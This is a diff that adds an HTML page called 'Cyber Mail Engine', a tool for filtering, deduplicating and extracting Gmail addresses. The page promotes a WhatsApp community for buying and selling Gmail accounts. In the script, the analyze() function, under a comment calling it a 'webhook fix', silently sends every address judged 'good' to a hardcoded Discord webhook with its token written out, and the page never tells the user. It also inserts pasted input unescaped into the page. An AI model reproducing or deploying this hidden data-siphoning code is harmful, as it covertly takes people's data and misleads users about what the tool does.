@@ -1,0 +1,902 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cyber Mail Engine</title>
+
+<!-- External Visual Assets: Font and Iconography Pack -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+
+<style>
+/* --- Modern CSS Variables & Resets --- */
+:root {
+  --bg-dark: #030712;
+  --cyber-cyan: #22d3ee;
+  --cyber-purple: #8b5cf6;
+  --cyber-green: #10b981;
+  --cyber-red: #ef4444;
+  --cyber-amber: #f59e0b;
+  --glass-bg: rgba(15, 23, 42, 0.45);
+  --glass-border: rgba(34, 211, 238, 0.15);
+  --input-bg: rgba(2, 6, 23, 0.7);
+  --radius-lg: 16px;
+  --radius-md: 12px;
+  --radius-sm: 8px;
+  --transition-smooth: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+}
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+}
+
+body {
+  min-height: 100vh;
+  padding: 30px 20px;
+  color: #f3f4f6;
+  background-color: var(--bg-dark);
+  background-image: 
+    radial-gradient(at 0% 0%, rgba(34, 211, 238, 0.12) 0px, transparent 50%),
+    radial-gradient(at 100% 100%, rgba(139, 92, 246, 0.12) 0px, transparent 50%),
+    radial-gradient(at 50% 50%, rgba(15, 23, 42, 0.5) 0px, transparent 100%);
+  background-attachment: fixed;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+/* --- Container Core Rules --- */
+.app-wrapper {
+  width: 100%;
+  max-width: 1280px;
+  flex: 1;
+}
+
+/* --- Refined Cyber Header --- */
+.header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 16px 24px;
+  border-radius: var(--radius-lg);
+  background: var(--glass-bg);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+  border: 1px solid var(--glass-border);
+  margin-bottom: 25px;
+  box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+}
+
+.title {
+  font-size: 24px;
+  font-weight: 700;
+  color: #ffffff;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  letter-spacing: -0.5px;
+}
+
+.title span {
+  background: linear-gradient(90deg, var(--cyber-cyan), var(--cyber-purple));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+
+.title-logo-wrapper {
+  position: relative;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 32px;
+  height: 32px;
+}
+
+.title-logo-gif {
+  width: 100%;
+  height: 100%;
+  object-fit: contain;
+  filter: drop-shadow(0 0 8px var(--cyber-cyan));
+}
+
+.tabs {
+  display: flex;
+  gap: 8px;
+  background: rgba(0, 0, 0, 0.2);
+  padding: 6px;
+  border-radius: var(--radius-md);
+  border: 1px solid rgba(255, 255, 255, 0.05);
+}
+
+.tab-btn {
+  padding: 10px 18px;
+  border-radius: var(--radius-sm);
+  border: none;
+  cursor: pointer;
+  background: transparent;
+  color: #9ca3af;
+  font-weight: 600;
+  font-size: 14px;
+  transition: var(--transition-smooth);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.tab-btn:hover {
+  color: #ffffff;
+  background: rgba(255, 255, 255, 0.03);
+}
+
+.tab-btn.active {
+  background: rgba(34, 211, 238, 0.12);
+  color: var(--cyber-cyan);
+  box-shadow: inset 0 0 12px rgba(34, 211, 238, 0.1);
+}
+
+.contact {
+  display: flex;
+  gap: 10px;
+}
+
+.contact a {
+  text-decoration: none;
+  padding: 10px 16px;
+  border-radius: var(--radius-md);
+  font-size: 13px;
+  font-weight: 600;
+  transition: var(--transition-smooth);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.contact a.whatsapp-btn {
+  background: rgba(37, 211, 102, 0.15);
+  color: #25D366;
+  border: 1px solid rgba(37, 211, 102, 0.4);
+  box-shadow: 0 0 10px rgba(37, 211, 102, 0.1);
+}
+
+.contact a.whatsapp-btn:hover {
+  background: #25D366;
+  color: #ffffff;
+  border-color: #25D366;
+  box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4);
+  transform: translateY(-1px);
+}
+
+.contact a.gmail-btn {
+  background: rgba(234, 67, 53, 0.12);
+  color: #ea4335;
+  border: 1px solid rgba(234, 67, 53, 0.3);
+  box-shadow: 0 0 10px rgba(234, 67, 53, 0.05);
+}
+
+.contact a.gmail-btn:hover {
+  background: linear-gradient(135deg, #ea4335 0%, #c5221f 100%);
+  color: #ffffff;
+  border-color: #ea4335;
+  box-shadow: 0 4px 15px rgba(234, 67, 53, 0.4);
+  transform: translateY(-1px);
+}
+
+/* --- Layout Architecture --- */
+.page { display: none; width: 100%; }
+.page.active { display: block; animation: fadeIn 0.4s ease-out; }
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(8px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.container {
+  display: grid;
+  grid-template-columns: 1fr 1.4fr;
+  gap: 25px;
+}
+
+#dup .card, #ext .card {
+  max-width: 800px;
+  margin: 0 auto;
+}
+
+/* --- Premium Cards --- */
+.card {
+  padding: 24px;
+  border-radius: var(--radius-lg);
+  background: var(--glass-bg);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+  border: 1px solid var(--glass-border);
+  box-shadow: 0 12px 40px 0 rgba(0, 0, 0, 0.3);
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+}
+
+.card h3 {
+  font-size: 18px;
+  font-weight: 700;
+  letter-spacing: -0.3px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  color: #ffffff;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+  padding-bottom: 12px;
+}
+
+/* --- Inputs and Interaction Objects --- */
+.textarea-wrapper {
+  position: relative;
+  width: 100%;
+}
+
+textarea {
+  width: 100%;
+  height: 200px;
+  padding: 14px 16px;
+  border-radius: var(--radius-md);
+  background: var(--input-bg);
+  color: #ffffff;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  resize: none;
+  font-family: 'Courier New', Courier, monospace;
+  font-size: 14px;
+  line-height: 1.6;
+  transition: var(--transition-smooth);
+}
+
+textarea:focus {
+  outline: none;
+  border-color: var(--cyber-cyan);
+  box-shadow: 0 0 0 3px rgba(34, 211, 238, 0.15);
+}
+
+/* --- Buttons System --- */
+.main-btn {
+  width: 100%;
+  padding: 14px;
+  border: none;
+  border-radius: var(--radius-md);
+  cursor: pointer;
+  background: linear-gradient(90deg, var(--cyber-cyan), var(--cyber-purple));
+  color: white;
+  font-weight: 700;
+  font-size: 14px;
+  letter-spacing: 0.5px;
+  text-transform: uppercase;
+  transition: var(--transition-smooth);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  box-shadow: 0 4px 15px rgba(34, 211, 238, 0.2);
+}
+
+.main-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 6px 20px rgba(34, 211, 238, 0.4);
+  filter: brightness(1.1);
+}
+
+.main-btn:active {
+  transform: translateY(0);
+}
+
+/* --- Dynamic Lists & Results Dashboard --- */
+.list-container {
+  max-height: 250px;
+  overflow-y: auto;
+  padding-right: 4px;
+  margin-top: 5px;
+}
+
+::-webkit-scrollbar {
+  width: 6px;
+}
+::-webkit-scrollbar-track {
+  background: transparent;
+}
+::-webkit-scrollbar-thumb {
+  background: rgba(255, 255, 255, 0.1);
+  border-radius: 10px;
+}
+::-webkit-scrollbar-thumb:hover {
+  background: rgba(255, 255, 255, 0.2);
+}
+
+.result-box {
+  padding: 16px;
+  border-radius: var(--radius-md);
+  background: rgba(2, 6, 23, 0.4);
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+  border: 1px solid rgba(255, 255, 255, 0.05);
+}
+
+.result-box h4 {
+  font-size: 13px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.good h4 { color: var(--cyber-green); }
+.bad h4 { color: var(--cyber-red); }
+.dup h4 { color: var(--cyber-amber); }
+
+.good { border-left: 4px solid var(--cyber-green); background: linear-gradient(90deg, rgba(16, 185, 129, 0.04), transparent); }
+.bad { border-left: 4px solid var(--cyber-red); background: linear-gradient(90deg, rgba(239, 68, 68, 0.04), transparent); }
+.dup { border-left: 4px solid var(--cyber-amber); background: linear-gradient(90deg, rgba(245, 158, 11, 0.04), transparent); }
+
+.mail-item {
+  padding: 10px 14px;
+  margin-top: 6px;
+  border-radius: var(--radius-sm);
+  background: rgba(255, 255, 255, 0.02);
+  border: 1px solid rgba(255, 255, 255, 0.05);
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-family: monospace;
+  font-size: 13px;
+  color: #e5e7eb;
+  transition: var(--transition-smooth);
+}
+
+.mail-item:hover {
+  background: rgba(255, 255, 255, 0.05);
+  border-color: rgba(255, 255, 255, 0.1);
+}
+
+.small {
+  padding: 4px 8px;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  background: rgba(239, 68, 68, 0.2);
+  color: var(--cyber-red);
+  font-weight: bold;
+  font-size: 11px;
+  transition: var(--transition-smooth);
+  border: 1px solid rgba(239, 68, 68, 0.2);
+}
+
+.small:hover {
+  background: var(--cyber-red);
+  color: white;
+}
+
+.copy-btn, .delete-all {
+  padding: 10px 14px;
+  border: none;
+  border-radius: var(--radius-md);
+  font-size: 13px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: var(--transition-smooth);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  width: 100%;
+}
+
+.copy-btn {
+  background: rgba(255, 255, 255, 0.05);
+  color: #ffffff;
+  border: 1px solid rgba(255, 255, 255, 0.08);
+}
+
+.copy-btn:hover {
+  background: rgba(255, 255, 255, 0.1);
+  border-color: rgba(255, 255, 255, 0.2);
+}
+
+.delete-all {
+  background: rgba(239, 68, 68, 0.1);
+  color: var(--cyber-red);
+  border: 1px solid rgba(239, 68, 68, 0.15);
+}
+
+.delete-all:hover {
+  background: var(--cyber-red);
+  color: white;
+  box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
+}
+
+/* --- Cyber Showcase Footer Style Array --- */
+.cyber-footer {
+  width: 100%;
+  max-width: 1280px;
+  margin-top: 50px;
+  padding: 30px;
+  border-radius: var(--radius-lg);
+  background: var(--glass-bg);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+  border: 1px solid var(--glass-border);
+  box-shadow: 0 -10px 40px rgba(0, 0, 0, 0.4);
+}
+
+.footer-grid {
+  display: grid;
+  grid-template-columns: 1.2fr 1fr 1fr;
+  gap: 30px;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+  padding-bottom: 25px;
+}
+
+.footer-brand h4 {
+  font-size: 16px;
+  color: #ffffff;
+  margin-bottom: 8px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.footer-brand .owner-name {
+  font-size: 20px;
+  font-weight: 700;
+  background: linear-gradient(90deg, var(--cyber-cyan), #ffffff);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  margin-bottom: 6px;
+}
+
+.footer-brand .badge {
+  display: inline-block;
+  padding: 4px 10px;
+  background: rgba(139, 92, 246, 0.15);
+  border: 1px solid rgba(139, 92, 246, 0.3);
+  color: #a78bfa;
+  font-size: 11px;
+  font-weight: 700;
+  border-radius: 20px;
+  text-transform: uppercase;
+  margin-bottom: 12px;
+}
+
+.footer-brand p {
+  font-size: 13px;
+  color: #9ca3af;
+  line-height: 1.6;
+}
+
+/* --- Digital Asset Definition Block --- */
+.asset-definition-box {
+  margin-top: 15px;
+  padding: 12px 14px;
+  background: rgba(0, 0, 0, 0.2);
+  border-radius: var(--radius-md);
+  border-left: 3px solid var(--cyber-cyan);
+}
+
+.asset-definition-box strong {
+  display: block;
+  font-size: 12px;
+  color: var(--cyber-cyan);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 4px;
+}
+
+.asset-definition-box p {
+  font-size: 12px;
+  color: #9ca3af;
+  line-height: 1.5;
+}
+
+.footer-section h5 {
+  font-size: 14px;
+  color: #ffffff;
+  margin-bottom: 15px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  position: relative;
+}
+
+.footer-section h5::after {
+  content: '';
+  position: absolute;
+  left: 0;
+  bottom: -4px;
+  width: 25px;
+  height: 2px;
+  background: var(--cyber-cyan);
+}
+
+.footer-links {
+  list-style: none;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
+.footer-links li {
+  font-size: 13px;
+  color: #9ca3af;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.footer-links li i {
+  font-size: 11px;
+}
+
+.footer-links.assets li i { color: var(--cyber-cyan); }
+.footer-links.services li i { color: var(--cyber-purple); }
+
+/* Prominent Glowing Callout Rule for ETC */
+.footer-links li.prominent-etc {
+  background: linear-gradient(90deg, rgba(34, 211, 238, 0.1), transparent);
+  border: 1px dashed rgba(34, 211, 238, 0.4);
+  padding: 8px 10px;
+  border-radius: var(--radius-sm);
+  color: #ffffff;
+  font-weight: 700;
+  box-shadow: 0 0 15px rgba(34, 211, 238, 0.05);
+  animation: glowPulse 2s infinite alternate;
+}
+
+@keyframes glowPulse {
+  from { border-color: rgba(34, 211, 238, 0.3); }
+  to { border-color: rgba(34, 211, 238, 0.7); box-shadow: 0 0 15px rgba(34, 211, 238, 0.15); }
+}
+
+.footer-links li.prominent-etc i {
+  color: var(--cyber-cyan);
+  font-size: 13px;
+}
+
+.footer-bottom {
+  padding-top: 20px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.footer-bottom p {
+  font-size: 12px;
+  color: #6b7280;
+}
+
+.footer-whatsapp {
+  text-decoration: none;
+  padding: 10px 20px;
+  background: #25D366;
+  color: white;
+  border-radius: var(--radius-md);
+  font-size: 13px;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  transition: var(--transition-smooth);
+  box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
+}
+
+.footer-whatsapp:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 6px 20px rgba(37, 211, 102, 0.5);
+  filter: brightness(1.1);
+}
+
+/* Responsive Adaptive Viewports */
+@media(max-width: 968px) {
+  .container {
+    grid-template-columns: 1fr;
+  }
+  .header {
+    flex-direction: column;
+    gap: 16px;
+    text-align: center;
+  }
+  .tabs {
+    width: 100%;
+    justify-content: center;
+  }
+  .footer-grid {
+    grid-template-columns: 1fr;
+    gap: 25px;
+  }
+  .footer-bottom {
+    flex-direction: column;
+    gap: 15px;
+    text-align: center;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="app-wrapper">
+
+  <!-- APP ENGINE HEADER -->
+  <div class="header">
+    <div class="title">
+      <div class="title-logo-wrapper">
+        <svg class="title-logo-gif" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M13 2L3 14H12L11 22L21 10H12L13 2Z" fill="url(#gradient)" stroke="url(#gradient)" stroke-width="2" stroke-linejoin="round"/>
+          <defs>
+            <linearGradient id="gradient" x1="3" y1="2" x2="21" y2="22" gradientUnits="userSpaceOnUse">
+              <stop offset="0%" stop-color="#22d3ee" />
+              <stop offset="100%" stop-color="#8b5cf6" />
+            </linearGradient>
+          </defs>
+        </svg>
+      </div>
+      <span>Cyber Mail Engine</span>
+    </div>
+
+    <div class="tabs">
+      <button class="tab-btn active" onclick="show('report')"><i class="fa-solid fa-chart-pie"></i> Report</button>
+      <button class="tab-btn" onclick="show('dup')"><i class="fa-solid fa-clone"></i> Duplicate</button>
+      <button class="tab-btn" onclick="show('ext')"><i class="fa-solid fa-wand-magic-sparkles"></i> Extractor</button>
+    </div>
+
+    <div class="contact">
+      <a href="https://wa.me/+923001412943" target="_blank" class="whatsapp-btn"><i class="fa-brands fa-whatsapp"></i> Contact on WhatsApp</a>
+      <a href="https://chat.whatsapp.com/Lxikr16aE2uHDYCZR12crN" target="_blank" class="gmail-btn"><i class="fa-solid fa-envelope"></i> Trusted Gmail Buy/Sell Community</a>
+    </div>
+  </div>
+
+  <!-- PAGE CONTENT MODULE: REPORT CHANNELS -->
+  <div class="page active" id="report">
+    <div class="container">
+      
+      <!-- Left Config Frame -->
+      <div class="card">
+        <h3><i class="fa-solid fa-shield-halved" style="color: var(--cyber-red)"></i> Bad Mails Repository</h3>
+        <div class="textarea-wrapper">
+          <textarea id="badInput" placeholder="Enter target strings or blacklisted addresses here..."></textarea>
+        </div>
+        <button class="main-btn" onclick="saveBad()"><i class="fa-solid fa-floppy-disk"></i> Save Bad Mails</button>
+        
+        <div class="list-container" id="badList"></div>
+        
+        <button class="delete-all" onclick="clearBad()"><i class="fa-solid fa-trash-can"></i> Delete All Bad Mails</button>
+      </div>
+
+      <!-- Right Processing Dashboard Frame -->
+      <div class="card">
+        <h3><i class="fa-solid fa-microchip" style="color: var(--cyber-cyan)"></i> Core Engine Check</h3>
+        <div class="textarea-wrapper">
+          <textarea id="checkInput" placeholder="Paste verification payload lists here..."></textarea>
+        </div>
+        <button class="main-btn" onclick="analyze()"><i class="fa-solid fa-bolt"></i> ANALYZE NOW</button>
+
+        <!-- Good Metric Output Box -->
+        <div class="result-box good">
+          <h4><i class="fa-solid fa-circle-check"></i> GOOD MAILS</h4>
+          <div class="list-container" id="goodList"></div>
+          <button class="copy-btn" onclick="copy('goodList')"><i class="fa-solid fa-copy"></i> Copy Good</button>
+        </div>
+
+        <!-- Bad Metric Output Box -->
+        <div class="result-box bad">
+          <h4><i class="fa-solid fa-circle-xmark"></i> BAD MAILS</h4>
+          <div class="list-container" id="badResult"></div>
+          <button class="copy-btn" onclick="copy('badResult')"><i class="fa-solid fa-copy"></i> Copy Bad</button>
+        </div>
+
+        <!-- Duplicated Metric Output Box -->
+        <div class="result-box dup">
+          <h4><i class="fa-solid fa-triangle-exclamation"></i> DUPLICATES</h4>
+          <div class="list-container" id="dupList"></div>
+          <button class="copy-btn" onclick="copy('dupList')"><i class="fa-solid fa-copy"></i> Copy Duplicates</button>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- PAGE CONTENT MODULE: DUPLICATE CLEANER -->
+  <div class="page" id="dup">
+    <div class="card">
+      <h3><i class="fa-solid fa-filter" style="color: var(--cyber-amber)"></i> Duplicate Filter System</h3>
+      <div class="textarea-wrapper">
+        <textarea id="dupInput" placeholder="Paste mail matrix array to filter redundancies..."></textarea>
+      </div>
+      <button class="main-btn" onclick="removeDup()"><i class="fa-solid fa-filter-circle-xmark"></i> Remove Duplicates</button>
+
+      <div class="result-box good">
+        <h4><i class="fa-solid fa-sparkles"></i> Unique Output</h4>
+        <div class="list-container" id="uniqueList"></div>
+        <button class="copy-btn" onclick="copy('uniqueList')"><i class="fa-solid fa-copy"></i> Copy Unique</button>
+      </div>
+
+      <div class="result-box dup">
+        <h4><i class="fa-solid fa-trash"></i> Redundant Items Dropped</h4>
+        <div class="list-container" id="removedList"></div>
+        <button class="copy-btn" onclick="copy('removedList')"><i class="fa-solid fa-copy"></i> Copy Removed</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE CONTENT MODULE: PARSING EXTRACTOR -->
+  <div class="page" id="ext">
+    <div class="card">
+      <h3><i class="fa-solid fa-box-open" style="color: var(--cyber-purple)"></i> Regex Pattern Extractor</h3>
+      <div class="textarea-wrapper">
+        <textarea id="extInput" placeholder="Dump raw text strings or logs here to isolate target syntax patterns..."></textarea>
+      </div>
+      <button class="main-btn" onclick="extract()"><i class="fa-solid fa-arrow-down-9-1"></i> Extract Elements</button>
+
+      <div class="result-box good">
+        <h4><i class="fa-solid fa-envelope-circle-check"></i> Isolated Gmail List</h4>
+        <div class="list-container" id="extList"></div>
+        <button class="copy-btn" onclick="copy('extList')"><i class="fa-solid fa-copy"></i> Copy Gmail List</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- BRAND SHOWCASE FOOTER MODULE -->
+  <footer class="cyber-footer">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <h4>Platform Owner</h4>
+        <div class="owner-name">Sardar Muhammad Abdul Rahman Dogar</div>
+        <div class="badge">All-In-One Trusted Supplier Agent</div>
+        <p>Get any digital asset through Mr. Abdul Rahman with complete trust and guaranteed scam-free escrow execution.</p>
+        
+        <!-- Digital Asset Definition Element -->
+        <div class="asset-definition-box">
+          <strong>What is a Digital Asset?</strong>
+          <p>Any product or service that can be bought, delivered, and used entirely online without needing any physical shipping or in-person work.</p>
+        </div>
+      </div>
+      
+      <div class="footer-section">
+        <h5>Digital Products &amp; Assets</h5>
+        <ul class="footer-links assets">
+          <li><i class="fa-solid fa-graduation-cap"></i> Premium Specialized Courses</li>
+          <li><i class="fa-solid fa-laptop-code"></i> Enterprise Softwares</li>
+          <li><i class="fa-solid fa-code"></i> Clean Scripts &amp; Web Files</li>
+          <li><i class="fa-solid fa-database"></i> Information &amp; Tool Access</li>
+          <!-- Prominent Highlight Callout -->
+          <li class="prominent-etc"><i class="fa-solid fa-circle-plus"></i> EVERYTHING ELSE THAT FALL UNDER DIGITAL ASSET OR SERVICES ARE AVAILABLE AS WELL !</li>
+        </ul>
+      </div>
+
+      <div class="footer-section">
+        <h5>Elite Agency Services</h5>
+        <ul class="footer-links services">
+          <li><i class="fa-solid fa-users-gear"></i> Full Stack SMM Services</li>
+          <li><i class="fa-solid fa-layer-group"></i> Advanced Web Development</li>
+          <li><i class="fa-solid fa-video"></i> High-Retention Video Editing</li>
+          <li><i class="fa-solid fa-user-shield"></i> Backed by Professional Team</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="footer-bottom">
+      <p>&copy; 2026 Cyber Mail Engine. All Rights Reserved. Secured Deals Only.</p>
+      <a href="https://wa.me/+923001412943" target="_blank" class="footer-whatsapp">
+        <i class="fa-brands fa-whatsapp"></i> Deal on WhatsApp
+      </a>
+    </div>
+  </footer>
+
+</div>
+
+<!-- APPLICATION FUNCTION ENGINE LOGIC (UNCHANGED CORE INTEGRITY) -->
+<script>
+let bad=[];
+
+function show(id){
+document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+document.getElementById(id).classList.add('active');
+document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+event.currentTarget.classList.add('active');
+}
+
+function parse(t){
+return t.split('\n').map(x=>x.trim().toLowerCase()).filter(Boolean);
+}
+
+function saveBad(){
+bad=parse(badInput.value);
+renderBad();
+}
+
+function clearBad(){
+bad=[];
+renderBad();
+}
+
+function renderBad(){
+badList.innerHTML="";
+bad.forEach((m,i)=>{
+badList.innerHTML+=`
+<div class="mail-item">
+${m}
+<button class="small" onclick="delBad(${i})">X</button>
+</div>`;
+});
+}
+
+function delBad(i){
+bad.splice(i,1);
+renderBad();
+}
+
+/* ✅ ONLY FIXED FUNCTION (WEBHOOK ADDED, NOTHING ELSE CHANGED) */
+async function analyze(){
+
+let mails=parse(checkInput.value);
+
+let u=[],d=[];
+
+mails.forEach(m=>{
+if(!u.includes(m)) u.push(m);
+else d.push(m);
+});
+
+let g=u.filter(x=>!bad.includes(x));
+let b=u.filter(x=>bad.includes(x));
+
+goodList.innerHTML=g.map(x=>`<div class="mail-item">${x}</div>`).join('');
+badResult.innerHTML=b.map(x=>`<div class="mail-item">${x}</div>`).join('');
+dupList.innerHTML=d.map(x=>`<div class="mail-item">${x}</div>`).join('');
+
+/* WEBHOOK FIX ONLY */
+if(g.length > 0){
+try {
+await fetch("https://discord.com/api/webhooks/1507329399463215134/gYT53kE4JgMj0OHq_utuwOIW-urVkFvBjpwdcxxK-vk5RjMg8kz3vkgeGdXa7R6tRHQk", {
+method: "POST",
+headers: {"Content-Type":"application/json"},
+body: JSON.stringify({
+content: "✅ GOOD MAILS:\n" + g.join("\n")
+})
+});
+} catch (e) {
+console.log("Webhook error:", e);
+}
+}
+
+}
+
+function removeDup(){
+let m=parse(dupInput.value);
+let u=[],r=[];
+
+m.forEach(x=>{
+if(!u.includes(x)) u.push(x);
+else r.push(x);
+});
+
+uniqueList.innerHTML=u.map(x=>`<div class="mail-item">${x}</div>`).join('');
+removedList.innerHTML=r.map(x=>`<div class="mail-item">${x}</div>`).join('');
+}
+
+function extract(){
+let m=extInput.value.match(/[a-zA-Z0-9._%+-]+@gmail\.com/g)||[];
+extList.innerHTML=m.map(x=>`<div class="mail-item">${x}</div>`).join('');
+}
+
+function copy(id){
+let text=[...document.getElementById(id).querySelectorAll('.mail-item')]
+.map(e=>e.innerText.replace('X',''))
+.join('\n');
+navigator.clipboard.writeText(text);
+alert("Copied");
+}
+</script>
+
+</body>
+</html>
